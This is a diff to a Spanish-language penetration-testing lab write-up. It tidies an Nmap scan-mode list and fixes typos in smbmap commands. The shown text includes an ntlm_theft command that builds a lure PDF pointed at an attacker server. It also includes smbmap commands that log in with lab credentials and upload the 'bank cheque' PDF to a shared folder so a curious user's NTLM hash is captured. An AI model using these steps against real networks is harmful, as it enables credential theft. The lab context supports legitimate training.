@@ -98,9 +98,8 @@ ping -c 2 10.10.124.125 lo que hacemos con la utilidad ping es basicamente envia
 
 </code></pre></div><p><img src="https://i.imgur.com/7g00QPd.png" alt=""></p>
 <p>Probando Distintos modos de escaneo con Nmap : SYN <strong>(Sigiloso y eficiente)</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">1. -sS : Un Scaneo sigiloso del tipo TCP/SYN , es un escaneo rapido y eficiente no es restringido por firewalls 
-
-2. -sT : Similar al escaneo TCP/SYN anterior con la diferencia de que este completa la conexion para despues despues finalizarla 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">-sS : Un Scaneo sigiloso del tipo TCP/SYN , es un escaneo rapido y eficiente no es restringido por firewalls 
+-sT : Similar al escaneo TCP/SYN anterior con la diferencia de que este completa la conexion para despues despues finalizarla 
 </code></pre></div><p>para entender los siguientes tipos de escaneo miremos las imagenes a continuación</p>
 <ol>
 <li><strong>Escaneo sigiloso SYN</strong> ya que no completa su conexion envia el paquete SYN, recibe el SYN/ACK pero no responde con un ACK para completar el saludo de 3 vias <strong>(3 way handshake)</strong> si no que envia un paquete <strong>RST</strong> para decirle que hubo un error y que reinicie la conexion.</li>
@@ -228,9 +227,9 @@ python3 ntlm_theft.py --server 10.10.124.240 --generate pdf -f cheque_a_cobrar.p
 </li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant
-smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -.H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant  --upload cheque_bancario.pdf  SharedFolder<span style="color:#ae81ff">\$</span>/consultant/cheque_bancario.pdf
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155 -r SharedFolder$
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant
+smbmap -u consultant -p Password123<span style="color:#ae81ff">\!</span> -d child.evilcorp.local -H 10.10.124.155 -r SharedFolder$<span style="color:#ae81ff">\\</span>consultant  --upload cheque_bancario.pdf  SharedFolder<span style="color:#ae81ff">\$</span>/consultant/cheque_bancario.pdf
 
 </code></pre></div><p><img src="https://i.imgur.com/1F68Ocd.png" alt=""></p>
 <p>Una vez subido nuestro fichero malicioso creado con <strong>ntlm_theft</strong>, esperamos a que alguien curioso quiera fijarse que clase de cheque bancario es.</p>
